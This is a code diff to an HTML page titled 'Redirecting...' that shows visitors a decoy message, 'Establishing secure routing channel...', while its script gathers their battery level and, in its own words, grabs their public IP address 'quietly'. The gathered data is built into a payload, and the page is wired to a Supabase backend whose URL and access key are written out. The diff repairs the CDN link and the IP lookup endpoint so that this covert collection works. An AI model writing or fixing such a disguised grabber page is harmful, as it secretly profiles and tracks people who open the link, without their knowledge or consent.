@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <title>Redirecting...</title>
-    <!-- Rock-solid UNPKG CDN CDN script loading link -->
-    <script src="https://unpkg.com"></script>
+    <!-- Fixed Supabase CDN SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body style="background: #f4f4f4;">
     <p style="font-family: monospace; color: #333; text-align: center; margin-top: 20%; font-size: 18px;" id="msg">Establishing secure routing channel...</p>
 
     <script>
         // CONFIGURATION LAYER - Linked to your active Supabase Instance
-        const SUPABASE_URL = "https://supabase.co";
+        const SUPABASE_URL = "https://yhernanwozabpmanoyif.supabase.co";
         const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InloZXJuYW53b3phYnBtYW5veWlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwNzg4OTcsImV4cCI6MjEwMDY1NDg5N30.YwMaRYcZkeGPTySRs34d7Cg0jr4MGR71WHkCQGkv6FA";
         
         // Explicit global verification fallback to prevent initialization crashes
@@ -78,9 +78,9 @@
                 payload.battery_charge = `${Math.round(b.level * 100)}%`;
             } catch(e){}
 
-            // Grab IP Address quietly
+            // Grab IP Address quietly using correct JSON endpoint
             try {
-                const ipRes = await fetch('https://ipify.org');
+                const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 payload.public_ip = ipData.ip;
             } catch(err){}
